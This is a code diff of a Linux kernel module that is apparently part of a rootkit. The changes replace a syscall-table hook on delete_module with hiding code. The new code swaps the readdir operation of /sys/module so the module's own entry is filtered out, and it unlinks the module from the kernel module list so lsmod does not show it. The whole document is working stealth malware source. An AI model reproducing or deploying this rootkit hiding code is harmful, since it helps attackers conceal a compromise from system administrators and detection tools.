@@ -1,69 +1,88 @@
 #include<linux/module.h>
-#include<linux/sched.h>
-#include<linux/kthread.h>
-#include<linux/mutex.h>
 #include<linux/list.h>
-#include<linux/string.h>
+#include<linux/kthread.h>
 #include<linux/sysfs.h>
-#include<../fs/sysfs/sysfs.h>
+#include<linux/fs.h>
 #include<linux/moduleparam.h>
-#include<linux/dynamic_debug.h>
 #include<linux/kobject.h>
-#include<linux/slab.h>
+#include<linux/types.h>
+#include<linux/namei.h>
 
-#include "hooking.h"
+static int is_hidden = 0; //this is set to 1 if hidden
 
 static struct list_head * tmp_head;
-static struct kobject tmp_kobj;
-static int (*orig_sys_delete_module)(const char * name, int flags);
 
-static int my_delete_module(const char * name, int flags){
-	if(strcmp(name, "rootkit") == 0){  //TODO: replace string with macro
-		printk(KERN_INFO "rootkit wants back to it's own kind\n");
-		mutex_lock(&module_mutex);
-		list_add(&THIS_MODULE->list, tmp_head);
-		mutex_unlock(&module_mutex);
-	}
-	return orig_sys_delete_module(name, flags);
+struct inode * sys_inode;
+static struct file_operations my_fops;
+const static struct file_operations *original_fops = 0;
+filldir_t sys_fill_dir;
+
+struct inode * get_sys_inode(void);
+static int readdir_sys (struct file*, void*, filldir_t);
+static void hide_sys_tree(void);
+static int my_filldir_t (void *, const char *, int, loff_t, u64, unsigned);
+
+struct inode * get_sys_inode(void)
+{
+	struct path sys_path;
+	if(kern_path("/sys/module", 0, &sys_path))
+		return NULL;
+	
+	return sys_path.dentry->d_inode;
 }
 
-static int hiding_thread(void * data){
+static int readdir_sys( struct file* f, void * a, filldir_t t){
+	sys_fill_dir = t;
 	
-	mutex_lock(&module_mutex);
-	printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");
-		
-	disable_wp();
-	orig_sys_delete_module = syscall_table[__NR_delete_module];
-	syscall_table[__NR_delete_module] = my_delete_module;
-	enable_wp();
-	
-	tmp_head = THIS_MODULE->list.prev;	
-	list_del(&THIS_MODULE->list);
-		
-	//tmp_kobj = THIS_MODULE->mkobj.kobj;
-	//kobject_del(&THIS_MODULE->mkobj.kobj);
-	//TODO save pointers maybe?
-	//THIS_MODULE->sect_attrs = NULL;
-	//THIS_MODULE->notes_attrs = NULL;
-	
-	mutex_unlock(&module_mutex);
+	return original_fops->readdir(f, a, my_filldir_t);
+}
 
+static int my_filldir_t (void * __buf, const char * name, int namelen, loff_t offset, u64 ino, unsigned d_type){
+	//if the dir belongs to our rootkit, don't list it
+	if(strcmp(name, THIS_MODULE->mkobj.kobj.name) == 0){
+		return 0;
+	}
+	return sys_fill_dir(__buf,name,namelen,offset,ino,d_type);
+}
+
+
+//Enable hiding
+static void hide_sys_tree(){
+	if(is_hidden == 0){
+		sys_inode = get_sys_inode();
+		if(sys_inode == NULL){
+			printk(KERN_INFO "Couldn't obtain sys inode\n");
+		}
+		else{
+			//hide from /sys/module/
+			original_fops = sys_inode->i_fop;
+			my_fops = *sys_inode->i_fop;
+			my_fops.readdir = readdir_sys;
+			sys_inode->i_fop = &my_fops;
+			
+			//hide from lsmod 
+			tmp_head = THIS_MODULE->list.prev;
+			list_del(&THIS_MODULE->list);		
 	
-	return 0;
+			is_hidden = 1;
+		}
+	}
 }
 
 void hide_code(void){
-	kthread_run(hiding_thread, NULL, "dontlookatme");
+	printk(KERN_INFO "Will hide code now\n");
+	hide_sys_tree();
 }
 
+//Disable hiding
 void make_module_removable(void){
-	//THIS_MODULE->mkobj.kobj = tmp_kobj;
-	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "%s", THIS_MODULE->mkobj.kobj.name);
+	if(is_hidden == 1){
+		sys_inode->i_fop = original_fops;
+		list_add(&THIS_MODULE->list, tmp_head);
+	}
 }
 
 void unhide_code(void) {
-	disable_wp();
-	syscall_table[__NR_delete_module] = orig_sys_delete_module;
-	enable_wp();
+	make_module_removable();
 }
 
